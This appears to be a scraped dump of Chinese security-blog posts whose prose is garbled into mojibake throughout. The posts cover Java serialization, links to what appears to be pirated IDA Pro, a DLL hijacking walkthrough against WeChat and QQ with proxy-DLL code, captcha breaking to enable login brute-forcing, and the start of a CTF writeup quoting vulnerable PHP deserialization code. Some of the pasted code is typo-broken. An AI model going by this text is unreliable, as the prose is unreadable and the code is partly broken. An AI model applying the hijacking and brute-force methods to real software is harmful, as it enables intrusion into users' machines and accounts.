†ï¼ˆheapï¼‰å†…å­˜ä¸­ï¼Œåªæœ‰JVMå¤„äºè¿è¡ŒçŠ¶æ€çš„æ—¶å€™ï¼Œè¿™äº›å¯¹è±¡æ‰å¯èƒ½å­˜åœ¨ã€‚ä¸€æ—¦JVMåœæ­¢ï¼Œè¿™äº›å¯¹è±¡ä¹Ÿå°±éšä¹‹æ¶ˆå¤±ï¼Œä½†æ˜¯åœ¨çœŸå®çš„åº”ç”¨åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿™äº›å¯¹è±¡æŒä¹…åŒ–ä¸‹æ¥ï¼Œå¹¶ä¸”åœ¨éœ€è¦çš„æ—¶å€™å°†å¯¹è±¡é‡æ–°è¯»å–å‡ºæ¥ï¼ŒJavaçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°è¯¥åŠŸèƒ½ã€‚ ä¸»è¦ä¸¤ç§ç”¨é€”ï¼š 1ï¼‰ æŠŠå¯¹è±¡çš„å­—èŠ‚åºåˆ—æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œé€šå¸¸å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼› 2ï¼‰ åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚ æœ€å¸¸è§çš„æ˜¯WebæœåŠ¡å™¨ä¸­çš„Sessionå¯¹è±¡ï¼Œå½“æœ‰ 10ä¸‡ç”¨æˆ·å¹¶å‘è®¿é—®ï¼Œå°±æœ‰å¯èƒ½å‡ºç°10ä¸‡ä¸ªSessionå¯¹è±¡ï¼Œå†…å­˜å¯èƒ½åƒä¸æ¶ˆï¼Œäºæ˜¯Webå®¹å™¨å°±ä¼šæŠŠä¸€äº›sessionå…ˆåºåˆ—åŒ–åˆ°ç¡¬ç›˜ä¸­ï¼Œç­‰è¦ç”¨äº†ï¼Œå†æŠŠä¿å­˜åœ¨ç¡¬ç›˜ä¸­çš„å¯¹è±¡è¿˜åŸåˆ°å†…å­˜ä¸­ã€‚ ç›¸å…³æ¥å£åŠç±» Javaä¸ºäº†æ–¹ä¾¿å¼€å‘äººå‘˜å°†javaå¯¹è±¡åºåˆ—åŒ–åŠååºåˆ—åŒ–æä¾›äº†ä¸€å¥—æ–¹ä¾¿çš„APIæ¥æ”¯æŒï¼Œå…¶ä¸­åŒ…æ‹¬ä»¥ä¸‹æ¥å£å’Œç±» java.io.Serializable //æ¥å£1 java.io.Externalizable //æ¥å£2 ObjectOutput ObjectInput ObjectOutputStream ObjectInputStream Demo ä½¿ç”¨Java.io.Serializableå¯¹ç±»çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– package com.company; import java.io.*; public class SerializableDemo1 { //å»ºç«‹Userç±»å®ç°javaæä¾›çš„Serializableæ¥å£ public static class User implements Serializable { private String userName; public void setName(String userName) { this.userName = userName; } public String getName() { return userName; } } //åºåˆ—åŒ–demo public static void main(String[] args) throws Exception, IOException { //åˆå§‹åŒ–å¯¹è±¡ User resOld = new User(); //è¦åºåˆ—åŒ–çš„å¯¹è±¡ resOld.setName(&quot;awsl&quot;); System.out.println(&quot;åºåˆ—åŒ–å‰:&quot; + resOld.getName()); //é¦–å°¾å‘¼åº”~ //åºåˆ—åŒ–å¯¹è±¡åˆ°æ–‡ä»¶ä¸­ FileOutputStream creatFile = new FileOutputStream(&quot;ser&quot;); //åˆ›å»ºseræ–‡ä»¶ ObjectOutputStream serResult = new ObjectOutputStream(creatFile); serResult.writeObject(resOld); //å°†åºåˆ—åŒ–åçš„å­—èŠ‚å†™å…¥æ–‡ä»¶ serResult.close(); //ååºåˆ—åŒ– FileInputStream readFile = new FileInputStream(&quot;ser&quot;); //è¯»å–seræ–‡ä»¶ ObjectInputStream unserFile = new ObjectInputStream(readFile); //è¯»å–åºåˆ—åŒ–åçš„å­—èŠ‚ User resNew = (User) unserFile.readObject(); //ååºåˆ—åŒ–è¿˜åŸå¯¹è±¡ unserFile.close(); System.out.println(&quot;åºåˆ—åŒ–å:&quot; + resNew.getName()); //é¦–å°¾å‘¼åº”~ } } ä½¿ç”¨java.io.Externalizableå¯¹ç±»çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– package com.company; import java.io.*; public class SerializableDemo2 { //å»ºç«‹Studyç±»å®ç°javaæä¾›çš„Externalizableæ¥å£ public static class Study implements Externalizable { private String myName; public void setName(String argsName){ this.myName = argsName; } public String getName() { return this.myName; } @Override //ä½¿ç”¨Externalizableæ¥å£ä¼šå¼ºåˆ¶ç”Ÿæˆæ­¤ç±» public void writeExternal(ObjectOutput out) throws IOException { out.writeObject(myName); //ä¸è¿™æ ·ä¼šå¯¼è‡´åºåˆ—åŒ–åï¼Œå˜é‡çš„å€¼è¢«æ¸…ç©º } @Override //ä½¿ç”¨Externalizableæ¥å£ä¼šå¼ºåˆ¶ç”Ÿæˆæ­¤ç±» public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException { myName = (String)in.readObject(); //ä¸è¿™æ ·ä¼šå¯¼è‡´åºåˆ—åŒ–åï¼Œå˜é‡çš„å€¼è¢«æ¸…ç©º } } public static void main(String[] args) throws IOException, ClassNotFoundException { //åˆå§‹åŒ–å‚æ•° Study resOld = new Study(); resOld.setName(&quot;xmsl&quot;); System.out.println(&quot;åºåˆ—åŒ–å‰:&quot; + resOld.getName()); //é¦–å°¾å‘¼åº” //åˆ›å»ºç”¨æ¥å­˜å‚¨åºåˆ—åŒ–å­—èŠ‚ç çš„æ–‡ä»¶ FileOutputStream creatFile = new FileOutputStream(&quot;ser2&quot;); //åºåˆ—åŒ– ObjectOutputStream serResult = new ObjectOutputStream(creatFile); serResult.writeObject(resOld); serResult.close(); //è¯»å–åˆšæ‰ç”¨æ¥å­˜å‚¨åºåˆ—åŒ–å­—èŠ‚ç çš„æ–‡ä»¶ FileInputStream readFile = new FileInputStream(&quot;ser2&quot;); //ååºåˆ—åŒ– ObjectInputStream unserResult = new ObjectInputStream(readFile); Study resNew = (Study) unserResult.readObject(); unserResult.close(); System.out.println(&quot;åºåˆ—åŒ–å:&quot; + resNew.getName()); //é¦–å°¾å‘¼åº” } } å…¶ä»– åºåˆ—åŒ–ä¿å­˜çš„æ˜¯å¯¹è±¡çš„çŠ¶æ€ é™æ€å˜é‡å±äºç±»çš„çŠ¶æ€ï¼Œå› æ­¤ åºåˆ—åŒ–å¹¶ä¸ä¿å­˜é™æ€å˜é‡ ä½¿ç”¨transientä¿®é¥°ä¸æƒ³è¢«åºåˆ—åŒ–çš„å˜é‡ï¼Œåœ¨å˜é‡å£°æ˜å‰åŠ ä¸Šè¯¥å…³é”®å­—ï¼Œå¯ä»¥é˜»æ­¢è¯¥å˜é‡è¢«åºåˆ—åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œåœ¨è¢«ååºåˆ—åŒ–åï¼Œtransient å˜é‡çš„å€¼è¢«è®¾ä¸ºåˆå§‹å€¼ï¼Œå¦‚ int å‹çš„æ˜¯ 0ï¼Œå¯¹è±¡å‹çš„æ˜¯ nullã€‚ public transient int youAge; ","link":"https://www.svenbeast.com/post/java-xu-lie-hua-he-fan-xu-lie-hua/"},{"title":"Windows IDA PRO 7.5 (x86, x64, ARM, ARM64)","content":"å¿½ç„¶å°±æ•´ä¸ªä¸–ç•Œéƒ½æœ‰äº†7.5çš„IDAï¼Œå¯æƒœæ²¡æœ‰macç‰ˆï¼Œo(â•¥ï¹â•¥)o ä¸‹è½½å¤‡ä»½åˆ†äº«ä¸€ä¸‹ ç™¾åº¦äº‘: https://pan.baidu.com/s/1R61Y9QrVi-gQQEw5kP2O1g å¯†ç : pmd4 Megaï¼šhttps://mega.nz/file/mwokCDzQ#TYGiRVS9JZhHJxNOxWmHwzVsBXSCZIfXXXF9TMiPe7o ","link":"https://www.svenbeast.com/post/windows-ida-pro-75-x86-x64-arm-arm64/"},{"title":"DLLåŠ«æŒåŠå°è¯•å¯¹å¾®ä¿¡å’ŒQQçš„åŠ«æŒ","content":"DLLåŠ«æŒå¯ç”¨äºæƒé™ç»´æŒã€æƒé™æå‡ã€è¿›ç¨‹æ³¨å…¥ï¼Œå±äºç»ä¹…ä¸è¡°çš„å¿…å¤‡æŠ€èƒ½ 0x01 DLLä»‹ç» DLLæ˜¯Dynamic Link Libraryçš„ç¼©å†™ï¼Œå«åšåŠ¨æ€é“¾æ¥åº“ ä¸€ä¸ªdllæ–‡ä»¶å¯ä»¥ç”±å¤šä¸ªç¨‹åºåŒæ—¶è°ƒç”¨ \bdllçš„ä½¿ç”¨æ„ä¹‰æ˜¯æŸä¸ªå¤§å‹ç¨‹åºåœ¨å¯åŠ¨æ—¶å’Œå¯åŠ¨åï¼Œå¯ä»¥ä¸åŠ è½½æŸéƒ¨åˆ†åŠŸèƒ½ä»£ç ï¼Œåªæœ‰ç”¨æˆ·ä½¿ç”¨æ—¶ å†å»è°ƒç”¨å¯¹åº”åŠŸèƒ½çš„dllæ¨¡å—ï¼Œä»è€Œè¾¾åˆ°å‡å°‘è½¯ä»¶å¯åŠ¨é€Ÿåº¦çš„ç›®çš„ 0x02 DLLåŠ«æŒå‰ç½®çŸ¥è¯†ç‚¹ åŠ«æŒçš„æ–¹æ³•äº†è§£åˆ°çš„æœ‰ä¸¤ç§ï¼Œåœ¨ä¹‹å‰è¦å…ˆçŸ¥é“ä¸€ä¸‹exeç¨‹åºåŠ è½½dllçš„çŸ¥è¯†ç‚¹ exeç¨‹åºåœ¨è°ƒç”¨dllæ—¶ï¼ŒæŸ¥æ‰¾dllæ–‡ä»¶çš„ç›®å½•ä¼˜å…ˆçº§é¡ºåº 1.ç¨‹åºæ‰€åœ¨ç›®å½• 2.ç¨‹åºåŠ è½½ç›®å½•ï¼ˆSetCurrentDirectoryï¼‰ 3.ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½• 4.16ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½• 5.Windowsç›®å½• 6.PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½• åœ¨win7åŠä»¥ä¸Šç³»ç»Ÿå¯¹åº”dllçš„ä¸€ä¸ªå®‰å…¨æœºåˆ¶--KnownDLLs KnownDLLsæ˜¯ä¸€ä¸ªæ³¨å†Œè¡¨çš„åç§°ï¼Œå¦‚æœæœ‰exeç¨‹åºè°ƒç”¨çš„dllåç§°å­˜åœ¨äºæ­¤ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆè¿™ä¸ªDLLä¼šè¢«ç¦æ­¢ä»EXEè‡ªèº«æ‰€åœ¨ç›®å½•ä¸‹è°ƒç”¨ï¼Œè€Œåªèƒ½ä»ç³»ç»Ÿç›®å½•å³SYSTEM32ç›®å½•ä¸‹è°ƒç”¨ æ³¨å†Œè¡¨ä½ç½®ï¼š\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 0x03 DLLåŠ«æŒ åŠ«æŒEXEåº”ç”¨è°ƒç”¨çš„ç¼ºå°‘çš„DLL(\bexeå‘å‡ºè¯·æ±‚ï¼Œåœ¨æŸä¸ªè·¯å¾„å¯»æ‰¾å¯¹åº”çš„dllï¼Œç»“æœå¯¹åº”è·¯å¾„ä¸å­˜åœ¨æ­¤dll) åŠ«æŒEXEåº”ç”¨\bæ­£å¸¸è°ƒç”¨çš„DLL(ç±»ä¼¼ç«¯å£è½¬å‘ï¼Œä½¿ç”¨ä¸€ä¸ªæ¶æ„dllå†’å……åŸå…ˆdllï¼Œæ‰§è¡Œå®Œæ¶æ„ä»£ç ååœ¨å°†è¯·æ±‚è½¬å‘åˆ°åŸå…ˆdllï¼Œä¸å½±å“åº”ç”¨æ­£å¸¸ä½¿ç”¨) ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•åŠ«æŒå¾®ä¿¡ é¦–å…ˆè¦æ‰¾åˆ°wechat.exeå‘å‡ºè¯·æ±‚ååŠ è½½dllçš„ç»“æœä¸ºNOT FOUNDçš„ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨è¾…åŠ©å·¥å…·Process Monitorï¼ˆä¸€æ¬¾ç³»ç»Ÿè¿›ç¨‹ç›‘è§†è½¯ä»¶ï¼‰ï¼Œç„¶åå†ä¸€ä¸€éªŒè¯å¯è¡Œæ€§ æ‰“å¼€Process Monitor â†“ æ‰“å¼€å¾®ä¿¡ â†“ è®¾ç½®Process Monitorçš„è¿‡æ»¤å™¨ï¼Œæ·»åŠ wechat.exeè¿›ç¨‹çš„PIDå°†æ˜¾ç¤ºçš„å…¶ä»–è¿›ç¨‹è¿‡ æ»¤æ‰ï¼Œå†æ·»åŠ å…¶ä»–ä¸€äº›è¿‡æ»¤è§„åˆ™(è§ä¸‹å›¾) â†“ ä¿å­˜ç»“æœä¸ºcsvæ–‡ä»¶ï¼Œç›®çš„ä¸ºäº†ç”¨execlé‡Œçš„ç­›é€‰ï¼Œå°†EXEç¨‹åºåŠ è½½çš„dllå•ç‹¬åˆ—å‡ºæ¥ â†“ æ­£å¸¸æ˜¯å°†æ¶æ„dllæ”¹æˆåŠ è½½çš„ä¸åœ¨KnownDLLsæ³¨å†Œè¡¨ä¸­çš„dllåç§°ï¼Œæ”¾åœ¨EXEåº”ç”¨åŒç›®å½•ï¼Œè¿™é‡Œä½¿ç”¨anhkggå¸ˆå‚…çš„æ‰¹é‡æ£€éªŒï¼Œå¯ä»¥å¸®åŠ©æˆ‘è‡ªåŠ¨é‡å‘½åæ–‡ä»¶ç„¶åæ‰§è¡ŒéªŒè¯çš„ä¸€äº›è‡ªåŠ¨åŒ–æ“ä½œ â†“ æ‰¾åˆ°ç›®æ ‡ï¼Œå°†æ¶æ„dllæ”¹åæ”¾å…¥wechat.exeåŒç›®å½•(å› ä¸ºåŠ è½½é¡ºåºåŒç›®å½•ä¼˜å…ˆçº§æœ€é«˜ï¼Œå½“ç„¶å…¶ä»–åœ°æ–¹ä¹Ÿå¯ä»¥) \b\b â†“ â†“ â†“ gifæ•ˆæœå›¾ ä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•åŠ«æŒQQ é¦–å…ˆæ‰¾åˆ°\b\b\bä¸€ä¸ªEXEç¨‹åºåŠ è½½çš„dllï¼Œä¸¤ä¸ªç¡¬æ€§è¦æ±‚ï¼ˆä¸€æ˜¯exeç¡®å®åŠ è½½äº†æ­¤dllï¼ŒäºŒæ˜¯æ­¤dllä¸åœ¨KnownDLLsæ³¨å†Œè¡¨ä¸­ï¼Œä¸è¿‡æ—¢ç„¶åœ¨åŒç›®å½•ä¸‹æ‰¾åˆ°çš„åŠ è½½dllï¼Œé‚£è‚¯å®šä¸åœ¨KnownDLLsé‡Œï¼‰ï¼Œç”¨æ¥ä¸­é—´äººè½¬å‘ä»–ä¹Ÿå°±æ˜¯åŠ«æŒï¼Œä¸€èˆ¬æ‰¾å°ç‚¹çš„ï¼Œå°ç‚¹çš„éœ€è¦è½¬å‘å‡½æ•°çš„æ•°é‡ä¼šå°‘ç‚¹ï¼ŒæŸ¥é˜…ä¸€äº›æ–‡ç« æ€»ç®—æ‰¾åˆ°ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„å·¥å…· dll-hijacking ï¼Œè¿™æ ·æˆ‘å°±ä¸ç”¨æ‰‹åŠ¨å¤åˆ¶å‡½æ•°äº† åœ¨QQ.exeåŒç›®å½•å¯»æ‰¾ç›®æ ‡dll â†“ \bå¤åˆ¶ç›®æ ‡dllåˆ°dll-hijackingå·¥å…·ä¸‹è¿›è¡ŒåŠ å·¥ â†“ å¤„ç†å¥½çš„æ¶æ„dllæ”¹å¥½åŸæœ¬çš„åå­—å¤åˆ¶åˆ°QQ.exeç›®å½•ä¸‹ï¼Œå°†åˆšæ‰å¤åˆ¶çš„æ­¤ ç›®å½•åŸæœ¬çš„dllåå­—æ”¹ä¸º åŸåå­—_.dll(è¿™æ ·æ­¤ç›®å½•å°±æœ‰ åŸåå­—.dll åŸåå­—_.dll) â†“ å¯åŠ¨QQ, overäº† â†“ â†“ â†“ gifæ•ˆæœå›¾ dllmain.cppå¼¹æ¡†ä»£ç  /* https://itm4n.github.io/dll-proxying/ https://www.codeproject.com/Articles/17863/Using-Pragmas-to-Create-a-Proxy-DLL to implement: hooking specific functions */ #include &quot;definitions.h&quot; #include &lt;thread&gt; #include &lt;chrono&gt; #include &lt;random&gt; extern &quot;C&quot;{ #include &lt;stdlib.h&gt; #include &lt;winsock2.h&gt; #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #include &lt;ws2tcpip.h&gt; } using namespace std; #pragma comment(lib,&quot;Ws2_32.lib&quot;) BOOL WINAPI DllMain( HINSTANCE hinstDLL, // handle to DLL module DWORD fdwReason, // reason for calling function LPVOID lpReserved) // reserved { srand(time(NULL)); switch (fdwReason) { case DLL_PROCESS_ATTACH: { MessageBox(NULL, &quot;Success&quot;, &quot;&quot;, MB_OK); break; } case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; default: break; } return true; } 0x04 å‚è€ƒé“¾æ¥ https://payloads.online/archivers/2018-12-22/1 https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&amp;mid=2247483851&amp;idx=1&amp;sn=8813719d4d3ac8b20bec495fcd5f2974&amp;chksm=fcb7834ecbc00a58da8a6408abe183e71175b442d0f02016ad3c67c9cf719927881bec14af49#rd ","link":"https://www.svenbeast.com/post/dll-jie-chi/"},{"title":"åˆ©ç”¨cnn_captchaå¯¹å›¾å½¢éªŒè¯ç æ·±åº¦å­¦ä¹ ","content":"0x01 ç›®çš„ æ—¥å¸¸æ¸—é€ç¯å¢ƒä¸­ï¼Œæœ‰ä¸å°‘çš„ç½‘ç«™å­˜åœ¨éªŒè¯ç ï¼Œå¯¼è‡´æ— æ³•é¡ºåˆ©çˆ†ç ´ï¼Œå­˜åœ¨æ¼æ´åœ¨çœ¼è¾¹æºœèµ°çš„å¯èƒ½æ€§ è€Œä¸€äº›æ¥å£ä¼šå­˜åœ¨ä¸€äº›æ¬¡æ•°æˆ–è€…è´¹ç”¨çš„é™åˆ¶ï¼Œå› ä¸ºä¸€ä¸ªå¯¹éªŒè¯ç è¯†åˆ«çš„åº“è¿˜æ˜¯æœ‰å¿…è¦çš„ å­˜åœ¨ç€è¾ƒæ£˜æ‰‹çš„å‘ç‚¹ï¼Œé‚è®°å½•ä¸‹macç³»ç»Ÿä¸‹å®‰è£…å’Œä½¿ç”¨cnn_captchaçš„è¿‡ç¨‹ 0x02 cnn_captcha \b* å¼•ç”¨å®˜æ–¹ä»‹ç» æœ¬é¡¹ç›®é’ˆå¯¹å­—ç¬¦å‹å›¾ç‰‡éªŒè¯ç ï¼Œä½¿ç”¨tensorflowå®ç°å·ç§¯ç¥ç»ç½‘ç»œï¼Œè¿›è¡ŒéªŒè¯ç è¯†åˆ«ã€‚ é¡¹ç›®å°è£…äº†æ¯”è¾ƒé€šç”¨çš„æ ¡éªŒã€è®­ç»ƒã€éªŒè¯ã€è¯†åˆ«ã€APIæ¨¡å—ï¼Œ æå¤§çš„å‡å°‘äº†è¯†åˆ«å­—ç¬¦å‹éªŒè¯ç èŠ±è´¹çš„æ—¶é—´å’Œç²¾åŠ›ã€‚ é¡¹ç›®å·²ç»å¸®åŠ©å¾ˆå¤šåŒå­¦é«˜æ•ˆå®Œæˆäº†éªŒè¯ç è¯†åˆ«ä»»åŠ¡ã€‚ å¦‚æœä½ åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‡ºç°äº† bugå’Œåšäº†è‰¯å¥½çš„æ”¹è¿›ï¼Œæ¬¢è¿æå‡ºissueå’ŒPRï¼Œä½œè€…ä¼šå°½å¿«å›å¤ï¼Œå¸Œæœ›èƒ½å’Œä½ å…±åŒå®Œå–„é¡¹ç›®ã€‚ å¦‚æœä½ éœ€è¦è¯†åˆ«ç‚¹é€‰ã€æ‹–æ‹½ç±»éªŒè¯ç ï¼Œæˆ–è€…æœ‰ç›®æ ‡æ£€æµ‹éœ€æ±‚ï¼Œä¹Ÿå¯ä»¥å‚è€ƒè¿™ä¸ªé¡¹ç›®nickliqian/darknet_captchaã€‚ 0x03 å®‰è£…åŠåˆå§‹åŒ– æˆ‘çš„ç¯å¢ƒ python3.8.6 macos10.15.6 clone é¡¹ç›® git clone https://github.com/nickliqian/cnn_captcha.git ä¿®æ”¹ä¸€ä¸‹requirments.txté‡Œçš„tensorflowåº“ç‰ˆæœ¬ï¼ˆåŸå…ˆæ˜¯tensorflow == 1.15.3 æ”¹ä¸ºtensorflow == 2.2.0ï¼‰ æˆ‘çš„pythonæ˜¯3.8ç‰ˆæœ¬ï¼Œå¦‚æœç›´æ¥æŒ‰ç…§åŸå…ˆç‰ˆæœ¬å®‰è£…æ˜¯ä¼šæŠ¥é”™æç¤ºæœªæ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬çš„ å› ä¸ºå¯¹åº”python3çš„tensorflowè¿™ä¸ªåº“çš„æœ€ä½éƒ½æ˜¯2.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œæ‰€ä»¥æ­¤å¤„å…ˆä¿®æ”¹å¥½ç‰ˆæœ¬ å®‰è£…requirments.txtï¼Œé™„ä¸€å¼ åˆ«çš„å›¾ï¼Œå› ä¸ºæˆ‘æ˜¯è¸©å‘çš„ï¼Œæ‰€ä»¥tensorflowå•ç‹¬å®‰çš„ pip3 install -r requirments.txt å¯¹cnn_captchaä¸­ä½¿ç”¨1.0å¤šç‰ˆæœ¬çš„tensorflowåº“è¯­æ³•å‡çº§åˆ°2.0ä»¥ä¸Š,åé¢æ“ä½œå°±å»æ–°çš„cnn_captcha_v2æ–‡ä»¶å¤¹æ“ä½œäº†ï¼ŒåŸå…ˆçš„å·²ç»æ²¡ç”¨äº† cd ../ //é€€åˆ°é¡¹ç›®å¤– tf_upgrade_v2 --intree cnn_captcha/ --outtree cnn_captcha_v2/ --reportfile report.txt å¼€å§‹ä¿®æ”¹pyæ–‡ä»¶å¯¼å…¥tensorflowçš„è¯­æ³•ï¼Œmacçš„æœç´¢æ¡†ç›´æ¥è¾“å…¥import tensorflow as tfæ¥æ‰¾åˆ°ä½¿ç”¨è¿™ä¸ªè¯­æ³•çš„pyæ–‡ä»¶ï¼Œå…¨éƒ¨ä¿®æ”¹ import tensorflow as tf â†“ import tensorflow as tf tf.compat.v1.disable_eager_execution() //å°±æ˜¯åŠ ä¸Šè¿™è¡Œçš„æ„æ€ ç„¶åå¯ä»¥æ­£å¼å¼€å§‹è¿è¡Œåˆ›å»ºè®­ç»ƒé›†ï¼Œconfæ–‡ä»¶å¤¹ä¸‹æ˜¯ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œéƒ½æ˜¯è´Ÿè´£ä»€ä¹ˆçš„ï¼Œmdæ–‡ä»¶ä¹Ÿæœ‰å†™ï¼Œé»˜è®¤å…ˆä¸ç®¡ï¼Œè¿™é‡Œå¼€å§‹ç”Ÿæˆè®­ç»ƒé›†ï¼Œå°±æ˜¯é¡¹ç›®è‡ªå¸¦çš„å¯ä»¥ç”ŸæˆéªŒè¯ç çš„pyæ–‡ä»¶ï¼Œç”Ÿæˆä¸€äº›ç”¨æ¥è®­ç»ƒçš„éªŒè¯ç å›¾ç‰‡ï¼Œåœ¨sample/originä¸‹ python3 gen_sample_by_captcha.py å¯¹éªŒè¯ç å›¾ç‰‡éªŒè¯å’Œæ‹†åˆ†æ•°æ®é›†ï¼Œæˆ‘æ˜¯æŒ‰ç…§é…ç½®åœ¨sampleç›®å½•ä¸‹åˆ›å»ºoriginã€trainã€testä¸‰ä¸ªç›®å½•ï¼Œä¸çŸ¥é“å¦‚æœä¸å­˜åœ¨è¿™äº›ç›®å½•æ˜¯å¦ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œè‡ªè¡Œæ–Ÿé…Œ python3 verify_and_split_data.py ç»ˆäºå¯ä»¥å¼€å§‹è®­ç»ƒäº†ï¼Œä¼šç”¨äº›æ—¶é—´ï¼Œå¯¹äº†ï¼Œé»˜è®¤æ˜¯å¯åŠ¨gpuçš„ python3 train_model.py å¯åŠ¨webserverï¼Œå°†ä¸‹åˆ—ä»£ç åŠ å…¥webserver_recognize_api.pyæ–‡ä»¶ï¼Œä»88è¡Œå¼€å§‹åŠ è¿›å»å°±è¡Œ ï¼Œè¿›è¡Œbase64æ˜¯ä¸ºäº†ä½¿ç”¨burpä¼ å›¾ç‰‡ç»™cnnæ—¶ä¿è¯éªŒè¯ç å›¾ç‰‡çš„ä¸€è‡´æ€§ @app.route('/base64',methods=['POST']) def up_imageBase64(): if request.method == 'Post' and request.form['image_file']: timec = str(time.time()).replace(&quot;.&quot;,&quot;&quot;) file = request.form['image_file'] img = base64,b64decode(fi1e)#è·å–bage64è½¬æˆå›¾ç‰‡ fimg =file read() img= BytesIO(img) img =Image.open(img, mode=&quot;r&quot;) print(&quot;æ¥æ”¶å›¾ç‰‡å°ºå¯¸:{}&quot;, format(img.size)) img_size = img.resize((image_width,image_height), Image.ANTIALIAS) print(&quot;æ¥æ”¶å›¾ç‰‡å°ºå¯¸2:{}&quot;.format(img.size)) s = time.time() value = R.rce_image(img_size) e= time.time() print(&quot;è¯†åˆ«ç»“æœ:{}&quot;.format(value)) print(&quot;ä¿å­˜å›¾ç‰‡: {}{}_{}.{}&quot;.format( api_image_dir, vallue, timec, image_suffix)) file_name =&quot;{}_{}.{}&quot;.format(value, timec, image_suffix) file_path =os.path.join(api_image_dir + file_name) img.save(file_path) result = { 'time': timec,#æ—¶é—´æˆ³ 'value': value,#é¢„æµ‹çš„ç»“æœ 'speed_time(ms)':int((e-s)*1000)#è¯†åˆ«è€—è´¹çš„æ—¶é—´ } img.close() return jsonify(result) else: content = json.dumps({'error_code':&quot;1001&quot;}) resp = response_headers(content) return resp ","link":"https://www.svenbeast.com/post/li-yong-cnn_captcha-dui-tu-xing-yan-zheng-ma-shen-du-xue-xi/"},{"title":"{N1CTFÂ·2020Â·webÂ·SignInÂ·writeup}","content":"å¼€å§‹\b è®¿é—®åœ°å€ç›´æ¥ç»™å‡ºäº†æºç : http://101.32.205.189 &lt;?php class ip { public $ip; public function waf($info){ } public function __construct() { if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){ $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']); }else{ $this-&gt;ip =$_SERVER[&quot;REMOTE_ADDR&quot;]; } } public function __toString(){ $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;); $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time()); if(!mysqli_query($con,$sqlquery)){ return mysqli_error($con); }else{ return &quot;your ip looks ok!&quot;; } mysqli_close($con); } } class flag { public $ip; public $check; public function __construct($ip) { $this-&gt;ip = $ip; } public function getflag(){ if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){ readfile('/flag'); } return $this-&gt;ip; } public function __wakeup(){ if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False) $this-&gt;ip = &quot;welcome to n1ctf2020&quot;; else $this-&gt;ip = &quot;noip&quot;; } public function __destruct() { echo $this-&gt;getflag(); } } if(isset($_GET['input'])){ $input = $_GET['input']; unserialize($input); } ç²—ç•¥ä¸€çœ‹ï¼Œæºç é‡Œunserialize($input)çš„å¤§å­—å‘Šè¯‰æˆ‘ä»¬æ˜¯éœ€è¦æ§åˆ¶ä¼ å…¥inputå‚æ•°çš„ååºåˆ—åŒ–æ•°æ®æ¥è¿›è¡Œä¸€äº›æ¡ä»¶çš„æ»¡è¶³ä»è€Œæ¥è·å¾—flag public function getflag(){ if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){ readfile('/flag'); } return $this-&gt;ip; } \bæœ€ç»ˆè¾¾æˆçš„ç›®çš„å¾ˆæ˜æ˜¾å°±æ˜¯è¿è¡Œflagç±»é‡Œçš„getflag()æ–¹æ³•ï¼Œé€šè¿‡readfileæ¥è·å¾—flagæ–‡ä»¶ï¼Œè€Œæƒ³è¦è¿è¡Œæ­¤æ–¹æ³•å°±è¦æ»¡è¶³æ¡ä»¶md5($this-&gt;check)===md5(&quot;key****************&quot;)ï¼Œå¹¶ä¸”keyæˆ‘ä»¬æ˜¯ä¸çŸ¥é“çš„ï¼Œçœ‹èµ·æ¥ä¹Ÿæ²¡æœ‰åŠæ³•æ§åˆ¶ï¼Œå¯ä»¥æ§åˆ¶çš„è¯è¿˜å¯ä»¥é€šè¿‡ä¼ å…¥æ•°ç»„è®©ä¸¤è¾¹md5å‡½æ•°æ¥è¿”å›nullæ¥è¿›è¡Œæ¡ä»¶æ»¡è¶³ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸ªkeyçš„å€¼ public function __toString(){ $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;); $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time()); if(!mysqli_query($con,$sqlquery)){ return mysqli_error($con); }else{ return &quot;your ip looks ok!&quot;; } mysqli_close($con); } 